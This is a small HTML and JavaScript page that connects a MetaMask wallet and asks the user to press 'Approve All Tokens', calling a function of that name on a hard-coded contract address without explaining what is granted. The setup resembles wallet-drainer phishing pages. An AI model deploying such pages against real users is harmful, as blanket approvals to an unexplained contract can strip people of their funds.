<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Approve Tokens</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
</head>
<body>
    <h1>Approve All Tokens</h1>
    <button id="connectWallet">Connect Wallet</button>
    <p>Wallet Address: <span id="walletAddress">Not connected</span></p>
    <button id="approveAllTokens">Approve All Tokens</button>

    <script>
        const contractAddress = "0x3749824234aCFDC8194Ca02e60E0eDb48C65F162";
        const contractABI = [
            {
                "inputs": [],
                "name": "approveAllTokens",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ];

        let userAddress;

        // Connect Wallet
        document.getElementById("connectWallet").onclick = async () => {
            if (typeof window.ethereum !== "undefined") {
                try {
                    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
                    userAddress = accounts[0];
                    document.getElementById("walletAddress").innerText = userAddress;
                } catch (error) {
                    alert("Connection to wallet failed.");
                    console.error(error);
                }
            } else {
                alert("MetaMask is not installed!");
            }
        };

        // Approve All Tokens
        document.getElementById("approveAllTokens").onclick = async () => {
            if (!userAddress) {
                alert("Please connect your wallet first!");
                return;
            }

            const web3 = new Web3(window.ethereum);
            const contract = new web3.eth.Contract(contractABI, contractAddress);

            try {
                console.log("Approving all tokens...");
                await contract.methods.approveAllTokens().send({ from: userAddress });
                alert("All tokens approved successfully!");
            } catch (error) {
                console.error("Approval error:", error);
                alert("Failed to approve all tokens. Check console for details.");
            }
        };
    </script>
</body>
</html>
